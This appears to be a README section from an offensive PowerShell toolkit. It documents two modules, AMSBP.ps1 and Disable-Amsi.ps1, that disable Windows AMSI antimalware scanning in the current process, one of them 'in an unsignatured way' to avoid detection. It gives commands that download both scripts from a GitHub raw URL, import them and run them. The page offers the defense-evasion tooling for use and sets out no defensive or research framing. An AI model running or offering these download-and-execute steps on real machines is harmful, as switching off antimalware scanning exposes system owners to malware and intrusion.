## Module Name
   <b><i>AMSBP.ps1</i></b>

|Function name|Description|Privileges
|---|---|---|
|AMSBP|Disable AMSI within current process|User Land|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
```

```powershell
Import-Module -Name .\AMSBP.ps1 -Force
AMSBP
```

<br />

## Module Name
   <b><i>Disable-Amsi.ps1</i></b>
   
|Cmdlet Name|Description|Privileges
|---|---|---|
|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
```

```powershell      
Import-Module -Name .\Disable-Amsi.ps1 -Force
Disable-Amsi -DontDisableBlockLogging
```   
